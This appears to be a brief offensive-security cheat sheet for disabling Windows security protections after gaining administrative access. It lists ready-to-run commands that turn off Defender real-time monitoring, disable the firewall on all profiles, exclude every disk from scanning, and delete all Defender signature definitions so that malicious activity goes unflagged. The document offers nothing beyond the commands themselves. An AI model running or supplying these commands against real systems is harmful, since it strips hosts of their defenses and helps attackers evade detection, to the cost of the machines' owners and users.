## Disable AV and Firewall with 2 commands

### Requirements: Administrative/System level access

#### 1) Set-MpPreference -DisableRealtimeMonitoring $True

#### 2) netsh advfirewall set allprofiles state off

#### 3) powershell  -c foreach ($disk in Get-WmiObject Win32_Logicaldisk){Add-MpPreference -ExclusionPath $disk.deviceid}

# Disable Signature Checks from Defender (Won't kill the AV, but it will not alert any activity because of signature disablement)

#### execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
